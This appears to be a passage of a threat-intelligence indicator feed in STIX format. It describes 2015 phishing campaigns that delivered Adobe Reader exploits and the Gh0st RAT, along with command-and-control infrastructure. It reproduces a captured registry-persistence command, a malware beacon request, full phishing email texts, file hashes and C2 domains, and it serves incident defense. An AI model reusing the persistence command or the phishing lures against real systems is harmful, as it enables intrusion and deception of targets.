C:\WINDOWS\system32\cmd.exe /c reg add hkcu\software\microsoft\windows\currentversion\run /v hotkey /t reg_sz /d ""C:\DOCUME~1\[USER]\LOCALS~1\Temp\update.exe -st"" /f & move ""C:\DOCUME~1\[USER]\LOCALS~1\Temp\word.exe"" ""C:\DOCUME~1\[USER]\LOCALS~1\Temp\update.exe"".
One open source report lists the name of this file as "HK Policy Act Report.doc".

The malware called back to this domain on port 443. If successful, it sends a GET request: .bin HTTP/1.1 Accept: */* Accept-Encoding: gzip, deflate User-Agent: Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E) Host: [RESOLVED IP FROM apple.dnsrd.com]:443 Connection: Keep-Alive

stix:STIX_Header.stix:Title: Phishing Emails with National Security Events Theme Deliver Adobe Reader Exploits
stix:STIX_Header.stix:Description: On 7 May 2015, a US Government Department received two versions of a phishing email with the subject line "National Security Planning Calendar" and the malicious attachment Natl Security Events 2015 (May 2015).pdf (MD5: 5D49807F42223E4DCFEF170F46BFC7C7). The malicious attachment exploits Adobe Reader vulnerabilities CVE-2013-0640 and CVE-2013-0641 to install a file extraction utility.

stix:Indicator.indicator:Description:
---- START EMAIL HEADER ---- EHLO mail-wi0-f181.google.com MAIL FROM:<jamepond117@gmail.com> SIZE=431620 RCPT TO: [REDACTED] DATA Received: by wiun10 with SMTP id n10so48086748wiu.1 for [REDACTED]; Thu, 07 May 2015 00:01:11 -0700 (PDT) DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20120113; h=mime-version:date:message-id:subject:from:to:content-type; bh=VhBxsJNUZ4v07kbJQeqqnZJF9oWf6dF6WSvZXCtameA=;  MIME-Version: 1.0 X-Received: by 10.194.223.66 with SMTP id qs2mr4714736wjc.6.1430982071487; Thu, 07 May 2015 00:01:11 -0700 (PDT) Received: by 10.194.18.114 with HTTP; Thu, 7 May 2015 00:01:11 -0700 (PDT) Date: Thu, 7 May 2015 16:01:11 +0900 Message-ID: <CABz+e3Zmrygn3v_oesK8XERVk39vvWGf46znvasaqkpT+ST07g@mail.gmail.com> Subject: National Security Planning Calendar From: [REDACTED] <jamepond117@gmail.com> To: [REDACTED] Content-Type: multipart/mixed; boundary=001a11c3b32c0d13c50515787aea --001a11c3b32c0d13c50515787aea Content-Type: text/plain; charset=UTF-8 ---- END EMAIL HEADER -----
---- START EMAIL BODY ----- Greetings, Attached please find the May 2015 edition of the National Security Events Planning Calendar. Please let me know if you are aware of an event that might be an appropriate addition to this calendar. Attached is supported by Adobe Reader version 10.x. best regards,
[REDACTED signature block] ---- END EMAIL BODY ----

---- START EMAIL HEADER ---- EHLO mail-wi0-f173.google.com MAIL FROM:<jamepond117@gmail.com> SIZE=1332212 RCPT TO: [REDACTED] DATA Received: by widdi4 with SMTP id di4so48254891wid.0 for [REDACTED]; Thu, 07 May 2015 00:06:02 -0700 (PDT) DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=gmail.com; s=20120113; h=mime-version:date:message-id:subject:from:to:content-type; bh=L2mY65K2kqcoB1XKRxyMY0K/pLz4Dg4rmZgC0rb3u/8=;  MIME-Version: 1.0 X-Received: by 10.180.73.180 with SMTP id m20mr3942899wiv.2.1430982362098; Thu, 07 May 2015 00:06:02 -0700 (PDT) Received: by 10.194.18.114 with HTTP; Thu, 7 May 2015 00:06:01 -0700 (PDT) Date: Thu, 7 May 2015 16:06:01 +0900 Message-ID: <CABz+e3bEr_9SBw13wH8G-CNm9G1XDiih3T3t9ES8-s3jUW1s+Q@mail.gmail.com> Subject: Re: National Security Planning Calendar From: [REDACTED] <jamepond117@gmail.com> To: [REDACTED] Content-Type: multipart/mixed; boundary=f46d043c7e665f70c90515788be9 --f46d043c7e665f70c90515788be9 Content-Type: text/plain; charset=UTF-8 ---- END EMAIL HEADER ----
---- START EMAIL BODY ---- Greetings, Attached please find the May 2015 edition of the National Security Events Planning Calendar. Please let me know if you are aware of an event that might be an appropriate addition to this calendar. Attached is supported by Adobe Reader version 10.x. best regards,
[REDACTED signature block] ---- END EMAIL BODY ----

This PDF document contains malicious JavaScript. Based on the exploit described in CVE-2013-0640 and CVE-2013-0641, malware will successfully run in Adobe Reader versions 9.5.3, 10.1.5, and 11.0.1.
A DLL file named D.T (MD5: 9CD3649C6A8D53880E2CAED01D0A6D7F) was installed in the user's temporary directory and then executed.

This is a DLL with no exports. It is an extract utility that has one import, kernel32.dll. It can create files from decoding base64 and removing XOR obfuscation to then run shellcode.
After this file is created, an exception occurs:
Exception Faulting Address: 0xffffffffffffffff Exception Code: 0xC0000005 Exception Level: SECOND_CHANCE Exception Type: STATUS_ACCESS_VIOLATION Instruction Address: 0x000000000d3d22dd Description: Read Access Violation
This is another malicious file.

stix:STIX_Header.stix:Title: Phishing Email with Pleasantly Surprised Theme
stix:STIX_Header.stix:Description: On 24 March 2015, a phishing email was sent from bigslurp@comcast.net with the subject "Pleasantly surprised". The email included the malicious attachment Pleasantly surprised.zip (MD5: 94783ce7c8b938dee9073d0b20e3283a), which contained the Gh0st remote administration tool (RAT). The Gh0st RAT called back to www.mybroiler.com.

stix:Indicator.indicator:Description: --- BEGIN EMAIL HEADER --- Received: from resomta-po-12v.sys.comcast.net ([96.114.154.236]) by resqmta-po-01v.sys.comcast.net with comcast id 7S5g1q00456HXL001S5g2L; Tue, 24 Mar 2015 14:05:40 +0000 Received: from resmail-po-108v.sys.comcast.net ([162.150.176.118]) by resomta-po-12v.sys.comcast.net with comcast id 7S5g1q0012ZeuZ601S5gTj; Tue, 24 Mar 2015 14:05:40 +0000 Date: Tue, 24 Mar 2015 14:05:39 +0000 (UTC) From: bigslurp@comcast.net To: [REDACTED] Subject: Pleasantly surprised --- END EMAIL HEADER ---
This is a Zip file with an embedded gh0st RAT installer/implant.

This is the Gh0st Rat installer/implant. It installs itself as a service for persistence at registry location
"HKLM\SYSTEM\ControlSet001\Services\INTER4\Description"
and contains the following name and description: Name: "INTER4" Description: "INTER4" The implant calls out to the domain www.mybroiler.com over TCP port 10005 with a 5 byte "FWKJG" gh0st RAT header.
The file Pleasantly surprised.exe (MD5 8b1af864a0e2a191f01d97b46720a162) calls out to this Command and Control over port 10005.

stix:STIX_Header.stix:Title: Command and Control IPs Identified from a Malware Incident
stix:STIX_Header.stix:Description: On 21 December 2014, malware was reported being observed on numerous networks. The implants in this malware family are typically loaded via a dropper, installed as a service, and then configured to listen on TCP port 443.

stix:Indicator.indicator:Description:
This is a newly identified command and control system that communicates over port 443. The IP address is registered in Caracas, Venezuela
This malware was a backdoor listener designed as a service DLL. It can perform functions such as file transfer, system survey, process manipulation, file time matching, and serve as a proxy. It resolves to a newly identified C2 node located in the United States.
According to the report, it is unclear if the attackers compromised and implanted these networks for adversarial infrastructure or if the networks are end-point victims of the attacker.

This is a newly identified command and control system that communicates over port 443. The IP address is registered in Buenos Aires, Argentina.
This malware was a backdoor listener designed as a service DLL. It can perform functions such as file transfer, system survey, process manipulation, file time matching, and serve as a proxy. It resolves to a newly identified C2 node located in the United States.
According to the report, it is unclear if the attackers compromised and implanted these networks for adversarial infrastructure or if the networks are end-point victims of the attacker.

This is a newly identified command and control system that communicates over port 443. The IP address is registered in Amman, Jordan
This malware was a backdoor listener designed as a service DLL. It can perform functions such as file transfer, system survey, process manipulation, file time matching, and serve as a proxy. It resolves to a newly identified C2 node located in the United States.
According to the report, it is unclear if the attackers compromised and implanted these networks for adversarial infrastructure or if the networks are end-point victims of the attacker.
